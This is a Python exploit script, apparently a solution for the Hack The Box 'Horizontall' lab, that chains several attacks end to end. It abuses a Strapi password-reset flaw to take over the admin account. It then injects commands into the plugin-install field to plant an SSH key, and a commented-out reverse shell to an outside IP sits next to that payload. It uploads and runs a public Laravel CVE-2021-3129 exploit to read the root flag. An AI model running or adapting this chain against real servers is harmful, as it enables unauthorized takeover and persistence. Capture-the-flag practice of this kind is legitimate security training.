#!/usr/bin/python3
from pwn import *
import base64
import os
import requests
import json
import random
import string


ssh_key_location = '/root/.ssh/APE.SSH.INYOURFACE'

context.log_level = 'error'


def gen_ssh():
    with os.popen('/usr/bin/ssh-keygen -t RSA -N "" -C "test key" -f ' + ssh_key_location) as p:
        pass


def foothold():
    email = "suck@your.cock"
    url = "http://api-prod.horizontall.htb"
    new_password = random.choice(string.ascii_lowercase) * 40
    s = requests.Session()
    version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)
    reset_request = {"email": email,
                     "url": "{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
    s.post("{}/".format(url), json=reset_request)
    exploit = {
        "code": {}, "password": new_password,
        "passwordConfirmation": new_password
    }
    r = s.post("{}/admin/auth/reset-password".format(url), json=exploit)
    jwt_token = r.json()['jwt']
    #data_revshell = {
    #    "plugin": "documentation $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.131 9001 >/tmp/f)",
    #    "port": "1337"
    #}

    with open(ssh_key_location + '.pub', 'rb') as ssh_key:
        pubkey = ssh_key.read()
    data_revshell = {
        "plugin": "documentation $(mkdir ~/.ssh; echo '" + base64.b64encode(pubkey).decode('latin-1') + "' | base64 -d > ~/.ssh/authorized_keys)",
        "port": "1337"
    }
    headers = {
        'Authorization': f'Bearer {jwt_token}'
    }
    proxies = {
        'http': 'http://localhost:8800'
    }
    r = s.post('http://api-prod.horizontall.htb/admin/plugins/install',
               headers=headers, json=data_revshell)


def upload_exploit():
    download_exploit = '''
    mkdir /tmp/exploit 2>/dev/null
    cd /tmp/exploit
    git clone https://github.com/nth347/CVE-2021-3129_exploit 2>/dev/null
    cd CVE*
    git clone https://github.com/ambionics/phpggc.git 2>/dev/null
    cd ..
    scp -i ''' + ssh_key_location + ''' -r /tmp/exploit/* strapi@horizontall.htb:/tmp/ 2>/dev/null
    '''
    with os.popen(download_exploit) as p:
        pass


def root():
    with ssh(user='strapi', host='horizontall.htb', keyfile=ssh_key_location) as s:
        user = s['cat /home/developer/user.txt'].decode('latin-1')
        root = s['''cd /tmp/CVE-*;python3 exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt" | tail -n 4 | head -n 1'''].decode(
            'latin-1')
    print("User Flag : " + user + "\nRoot Flag : " + root)


if __name__ == "__main__":
    #print("gen_ssh()")
    gen_ssh()
    #print("foothold()")
    foothold()
    #print("upload_exploit()")
    upload_exploit()
    #print("root()")
    root()
